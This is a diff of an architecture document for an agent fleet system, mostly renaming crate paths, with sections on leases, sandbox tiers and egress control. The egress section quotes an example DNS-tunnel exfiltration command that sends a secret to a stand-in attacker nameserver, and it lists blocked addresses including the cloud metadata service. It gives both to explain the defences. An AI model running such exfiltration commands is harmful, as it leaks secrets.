@@ -15,7 +15,7 @@ Every row is extracted from the sections below; the owner column names the secti
 
 | Invariant | Value | Mechanism | Owner section |
 |---|---|---|---|
-| Lease expiry backstop | `LEASE_TTL` = 30 s (single-sourced for the control plane in `afd_core`'s timing constants) | the next eligible ledger claim re-leases an expired slot with a higher fencing token | §Failure recovery model |
+| Lease expiry backstop | `LEASE_TTL` = 30 s (single-sourced for the control plane in `af_core`'s timing constants) | the next eligible ledger claim re-leases an expired slot with a higher fencing token | §Failure recovery model |
 | Max run duration | `MAX_RUNTIME` hard cap | `/renew` extends to `min(now+LEASE_TTL, created_at+MAX_RUNTIME)` | §Per-lease renewal |
 | Stale-writer rejection | `UZ-RUN-005` | `report` verifies the monotonic `fencing_token` in the same atomic statement that flips the lease | §System guarantees |
 | Sandbox failure fails closed | `startup_posture` | the turn never runs; the lease reports `fleet_error` naming why, and nothing runs unsandboxed in its place | §System guarantees |
@@ -197,10 +197,10 @@ The build graph keeps datastore crates outside the runner. [Runner process model
 
 | Layer | Path | Build graph | Links | Role |
 |---|---|---|---|---|
-| wire | `rustd/crates/protocol/afd_wire` | both | none | the frozen `/v1/runners` wire types — protocol, event envelope, execution policy, execution result, activity |
-| shared knobs | `rustd/crates/foundation/afd_core` | both | none | the knobs both planes key off (`LEASE_TTL`, …), `error_shell!` |
+| wire | `rustd/crates/protocol/af_wire` | both | none | the frozen `/v1/runners` wire types — protocol, event envelope, execution policy, execution result, activity |
+| shared knobs | `rustd/crates/foundation/af_core` | both | none | the knobs both planes key off (`LEASE_TTL`, …), `error_shell!` |
 | control plane | `rustd/crates/daemon/afd_fleet` · `rustd/crates/daemon/afd_runner` · `rustd/crates/daemon/afd_api_runner` | `agentsfleetd` (`rustd/crates/daemon/agentsfleetd`) | `sqlx`, `redis` | lease / fence / reclaim / assignment, the background sweepers (`afd_runner::sweep`, started in `rustd/crates/daemon/agentsfleetd/src/sweepers/mod.rs`), and the `/v1/runners` handlers over them |
-| runner | `rustd/crates/runner/afr_supervisor` · `afr_agent` · `afr_providers` · `afr_tools` · `afr_egress` · `afr_secrets` · `afr_memory` · `afr_executor` · `afr_sandbox` · `afr_telemetry` | `agentsfleet-runner` (`rustd/crates/runner/agentsfleet_runner`) | none | supervisor, agent loop, tool catalog, outbound guard, executor and sandbox engine; imports nothing from the control plane |
+| runner | `rustd/crates/runner/afr_supervisor` · `afr_agent` · `af_providers` · `afr_tools` · `af_egress` · `af_secrets` · `afr_memory` · `afr_executor` · `afr_sandbox` · `afr_telemetry` | `agentsfleet-runner` (`rustd/crates/runner/agentsfleet_runner`) | none | supervisor, agent loop, tool catalog, outbound guard, executor and sandbox engine; imports nothing from the control plane |
 
 ## The control protocol — `/v1/runners`
 
@@ -262,7 +262,7 @@ Supported software still advertises `durable_tasks_v1` while its assignment is O
 Existing durable leases retain their frozen mode, input, recovery, accounting and report duties.
 The candidate, claim and final issue checks all require configured support before a new durable lease commits.
 
-The **heartbeat cadence travels the same way** (M205). `afd_core::timing` owns both `RUNNER_OFFLINE_AFTER` and the `HEARTBEAT_INTERVAL` served beneath it, and a compile-time assertion beside them keeps the served cadence strictly below the offline threshold. A host holds no interval of its own, so moving the threshold moves every host's beat within one cycle. The field is required rather than optional: a reply without it is refused at parse and the beat takes the existing backoff, because a runner guessing its own cadence is the drift this removes.
+The **heartbeat cadence travels the same way** (M205). `af_core::timing` owns both `RUNNER_OFFLINE_AFTER` and the `HEARTBEAT_INTERVAL` served beneath it, and a compile-time assertion beside them keeps the served cadence strictly below the offline threshold. A host holds no interval of its own, so moving the threshold moves every host's beat within one cycle. The field is required rather than optional: a reply without it is refused at parse and the beat takes the existing backoff, because a runner guessing its own cadence is the drift this removes.
 
 The host never declares policy. The per-policy environment variables that once did are removed outright rather than deprecated, so there is no fallback path two sources of truth could diverge through. The failure that removes: a dev worker advertised `landlock_full` while refusing every lease for two days, because the dashboard's tier and the host's env file held different values and nothing compared them.
 
@@ -416,7 +416,7 @@ bubblewrap, Landlock, seccomp, the lease's cgroup and the process boundary under
 ### Multi-run events
 
 One lease is one run. [Conversation compaction](context_lifecycle.md) saves working notes and continues within that lease, retaining tool access.
-A report's outcome is `processed` or `fleet_error`; context pressure does not request another lease (`rustd/crates/protocol/afd_wire/src/report/mod.rs`).
+A report's outcome is `processed` or `fleet_error`; context pressure does not request another lease (`rustd/crates/protocol/af_wire/src/report/mod.rs`).
 
 A continuation event still exists, chained by `resumes_event_id`: an approval's answer writes one, and the next lease runs it (`rustd/crates/daemon/afd_approval/src/inbox/resolve/mod.rs`). Durable state across runs is in `agentsfleetd`, never runner-local, which is why any runner can take the next event. Sticky routing (below) prefers the runner that ran the previous one, but correctness never depends on it.
 
@@ -574,7 +574,7 @@ Eligibility requires that holder to be active, not degraded, and seen within `RU
 
 ## Config
 
-A Fleet's config (model, tool allowlist, network policy, context budget, gate rules, trigger settings, secret references) is the `config` member of its selected setup revision in `fleet.revisions`, validated by `afd_fleet_runtime::Definition` (`afd_fleet_runtime/src/definition/mod.rs`). The claim reads it from that revision (`afd_fleet/src/lease/installed.rs`). A reviewed improvement (`POST /v1/workspaces/{ws}/fleets/{id}/revisions`, N11 in [`api_resources.md`](./api_resources.md)) appends a new revision and selects it; `PATCH` on the fleet changes only its status and name.
+A Fleet's config (model, tool allowlist, network policy, context budget, gate rules, trigger settings, secret references) is the `config` member of its selected setup revision in `fleet.revisions`, validated by `af_fleet_runtime::Definition` (`af_fleet_runtime/src/definition/mod.rs`). The claim reads it from that revision (`afd_fleet/src/lease/installed.rs`). A reviewed improvement (`POST /v1/workspaces/{ws}/fleets/{id}/revisions`, N11 in [`api_resources.md`](./api_resources.md)) appends a new revision and selects it; `PATCH` on the fleet changes only its status and name.
 
 `agentsfleetd` resolves config fresh from Postgres on every `lease`, so config changes take effect on the **next command** (the next lease) with no signaling. There is no in-memory config cache and no `fleet_config_changed` consumer to wait on — the deleted worker's watcher-reload path is gone. A config change never alters a language-model turn already in flight; the next run picks it up.
 
@@ -596,7 +596,7 @@ It checks runner labels and live sandbox holds before attempting a claim. Every 
 
 ## Sandbox tiers
 
-The control plane ASSIGNS a tier to each runner row (Add Runner / the fleet PATCH) and delivers it with the runner's identity on enrollment and every heartbeat. The host probes what its kernel can enforce and reports that upward. A host whose report cannot satisfy its assignment is marked degraded and issued no work (§Assigned policy and reconciliation). The capability report stays unauthenticated self-assertion, so trust for placement remains operator-assigned, not host-claimed. Only tiers with real enforcement are assignable (`rustd/crates/protocol/afd_wire/src/runner/mod.rs`).
+The control plane ASSIGNS a tier to each runner row (Add Runner / the fleet PATCH) and delivers it with the runner's identity on enrollment and every heartbeat. The host probes what its kernel can enforce and reports that upward. A host whose report cannot satisfy its assignment is marked degraded and issued no work (§Assigned policy and reconciliation). The capability report stays unauthenticated self-assertion, so trust for placement remains operator-assigned, not host-claimed. Only tiers with real enforcement are assignable (`rustd/crates/protocol/af_wire/src/runner/mod.rs`).
 
 | `sandbox_tier` | Where | What the daemon demands of the report |
 |---|---|---|
@@ -634,7 +634,7 @@ The table covers the file system alone. Under `allow_all` the sandbox also share
 
 The runner box is **outbound-only**: it runs no inbound listener (the supervisor dials the control plane over HTTPS; see §Datastore role model) and holds no co-located datastore. No model key or minted token enters a sandbox, so the network threat from a sandbox is a tenant program sending the workspace's contents, or anything it computes, somewhere it should not, or reaching an internal address.
 
-Three network policies, assigned per runner (`rustd/crates/protocol/afd_wire/src/runner/mod.rs`):
+Three network policies, assigned per runner (`rustd/crates/protocol/af_wire/src/runner/mod.rs`):
 
 - **`allow_all`** — bubblewrap is not given `--unshare-net`, so the sandbox stays in the host's network namespace and all outbound egress is allowed (`rustd/crates/runner/afr_sandbox/src/bubblewrap/mod.rs`).
 - **`deny_all_egress`** — the sandbox's own network namespace, with loopback only; it reaches nothing. A missing assignment gets the same, because a runner never opens egress on missing input.
@@ -658,13 +658,13 @@ A fleet with `read_only` keeps its hosts out of the kernel set. Kernel rules can
 
 Each entry is read as a URL's host, using `https://` when no scheme is present. A scheme, port or path is dropped; `[::1]:80` names `::1`.
 
-HTTP tools parse additional domains with the same helper, `afr_egress::allowlist_host`. The supervisor resolves sandbox names to IPv4 with the host resolver.
+HTTP tools parse additional domains with the same helper, `af_egress::allowlist_host`. The supervisor resolves sandbox names to IPv4 with the host resolver.
 
 **The inference host is not in the set.** The agent loop calls the model provider from the supervisor, outside every sandbox, at the base URL saved for the selected model ([Runner execution](./runner_execution.md) §Crates). A sandbox has no reason to reach it.
 
 **Name resolution is supervisor-provided; there is no reachable resolver.** The supervisor renders a static `/etc/hosts`, each allowlist name with its resolved address, and an `/etc/resolv.conf` naming no server, both bound read-only into the sandbox. nf_tables drops **all** sandbox egress to port 53, so no forwarding resolver is reachable. That closes the DNS-tunnel exfiltration channel (`dig $secret.attacker-ns.com @resolver`) by the *absence* of any resolver. An undeclared host misses `/etc/hosts` and fails **fast at resolution**, with no 30-second hang.
 
-**Fail-closed and IPv4 only.** A name that does not resolve, or resolves to IPv6 alone, a set over 256 addresses, and any netlink failure each refuse the lease, and the refusal names its reason. So does a host from the fleet's `network.allow` that resolves to any address `afd_core::net::is_blocked` refuses: loopback, the private ranges, the tailnet's shared range `100.64.0.0/10`, link-local with the cloud metadata service `169.254.169.254`, and everything reserved. That is the predicate `http_request` and the daemon's endpoint check use, so a host refused at the request layer is refused at the kernel too. The lease ends with "the fleet allows an egress host at a private or reserved address", the fleet owner's to fix; the log names the host, never the address. Registry hosts are exempt: the operator may point them at a mirror on its own network. IPv6 egress is out of scope.
+**Fail-closed and IPv4 only.** A name that does not resolve, or resolves to IPv6 alone, a set over 256 addresses, and any netlink failure each refuse the lease, and the refusal names its reason. So does a host from the fleet's `network.allow` that resolves to any address `af_core::net::is_blocked` refuses: loopback, the private ranges, the tailnet's shared range `100.64.0.0/10`, link-local with the cloud metadata service `169.254.169.254`, and everything reserved. That is the predicate `http_request` and the daemon's endpoint check use, so a host refused at the request layer is refused at the kernel too. The lease ends with "the fleet allows an egress host at a private or reserved address", the fleet owner's to fix; the log names the host, never the address. Registry hosts are exempt: the operator may point them at a mirror on its own network. IPv6 egress is out of scope.
 
 A scope that fails to build is torn down with its sandbox, and the lease is refused. The sandbox starts in a namespace holding only loopback. `prepare` returns it only after `join` builds its scope, so no tool call reaches it before its rules exist (`rustd/crates/runner/afr_sandbox/src/bubblewrap_engine/mod.rs`).
 
@@ -692,7 +692,7 @@ Dedicated UI controls remain future work.
 
 `http_request` follows 301, 302, 303, 307 and 308 only for a bodyless GET.
 
-The shared HTTP builder still disables automatic redirects. The tool composes continuations through the same lease's admission before each send (`afr_tools/src/egress/mod.rs`, `afr_egress/src/redirect/mod.rs`).
+The shared HTTP builder still disables automatic redirects. The tool composes continuations through the same lease's admission before each send (`afr_tools/src/egress/mod.rs`, `af_egress/src/redirect/mod.rs`).
 
 HTTPS, reviewed destination scope, address and origin request rules remain authoritative at every hop.
 
@@ -710,7 +710,7 @@ Missing, duplicate, malformed or oversized targets stop safely.
 
 At the first origin change, including effective port, the chain permanently drops all modeled headers. Later hops cannot restore them or mint another credential. The lease guard covers admission and minting, then releases before every transport wait.
 
-Private targets have no raw Debug or serialized projection. The model sees only a safe origin on a redirect refusal. Final response text and content type mask the finite known target spellings, including credential-like query values (`afr_egress/src/redirect/privacy/mod.rs`).
+Private targets have no raw Debug or serialized projection. The model sees only a safe origin on a redirect refusal. Final response text and content type mask the finite known target spellings, including credential-like query values (`af_egress/src/redirect/privacy/mod.rs`).
 
 Unknown secrets and arbitrary repeated encodings are outside that detection claim. Redirect outcome records carry bounded status, counts and reasons; see [observability](./observability.md).
 
@@ -740,7 +740,7 @@ The fleet census publishes unsettled admission count and oldest age.
 Use the maximum across replicas, since each census reads the deployment-wide ledger.
 A failed census withdraws both gauges rather than exporting an old value.
 
-The four per-runner families live in a fixed-capacity (4096-series) table keyed on `runner_id`, held by the daemon in `afd_observability`: a lookup takes a read lock and the counters underneath it are atomics, so recording never blocks another recorder. The OTLP export reads only that in-memory snapshot — **zero Postgres on the export path**, so the export stays healthy exactly when the database is not. Cardinality is capped: the 4097th distinct `runner_id` routes to `runner_id="_other"` (counters preserved). Footprint is therefore bounded by that cap regardless of fleet size or uptime; a `agentsfleetd` restart zeroes the table (Prometheus counter-reset semantics absorb it; gauges self-heal within one heartbeat/lease cycle).
+The four per-runner families live in a fixed-capacity (4096-series) table keyed on `runner_id`, held by the daemon in `af_observability`: a lookup takes a read lock and the counters underneath it are atomics, so recording never blocks another recorder. The OTLP export reads only that in-memory snapshot — **zero Postgres on the export path**, so the export stays healthy exactly when the database is not. Cardinality is capped: the 4097th distinct `runner_id` routes to `runner_id="_other"` (counters preserved). Footprint is therefore bounded by that cap regardless of fleet size or uptime; a `agentsfleetd` restart zeroes the table (Prometheus counter-reset semantics absorb it; gauges self-heal within one heartbeat/lease cycle).
 
 ### Multi-replica (`agentsfleetd` N>1) — correctness is an *aggregation* property
 
@@ -786,7 +786,7 @@ Each authoring lease has an attempt identity, fence, expiry, pinned model/infere
 
 The daemon issues an opaque lease capability and serves the fourth machine route, `/model-calls`. [The resource reference](api_resources.md) owns its issuance, bindings, wire, expiry, revocation, dispatch receipts, and replay behavior. The daemon holds provider keys and dispatches each authorized call; the runner receives bounded text/proposals/usage. Existing raw-key runtime transport is not reused for authoring. Keep automatic transport retries disabled on this path, count every physical send, and stop on an unresolved dispatch. Real-router integration tests must deny foreign runner/model bindings, expired/revoked tokens, duplicate physical sends, and runtime credential minting. A local capability type alone supplies no boundary proof.
 
-Both adapters call the shared `afd_inference::stream::StreamTurn` reader over Rig's native codecs.
+Both adapters call the shared `af_inference::stream::StreamTurn` reader over Rig's native codecs.
 The reader owns cancellation, inactivity and finalization; known partial usage survives a failed response.
 Purpose adapters retain separate physical senders, permissions and retry eligibility.
 
@@ -810,7 +810,7 @@ Original history remains creator-private and is read in bounded pages. [Conversa
 
 Before each physical send, the daemon funds the complete measured request and known prior costs. It releases database locks while funding, then rechecks source and authority before recording dispatch intent (`afd_authoring/src/model/dispatch/funding.rs`).
 
-The shared window planner reserves output and framing headroom. The turn's remaining output allowance and selected model's physical window still bound every request (`afd_context/src/window.rs`).
+The shared window planner reserves output and framing headroom. The turn's remaining output allowance and selected model's physical window still bound every request (`af_context/src/window.rs`).
 
 The `o200k_base` estimate for an unrecognized model carries a quarter of headroom, so it can refuse input that the provider's tokenizer would fit. Provider-reported usage remains authoritative for settlement, including charged reasoning tokens.
 
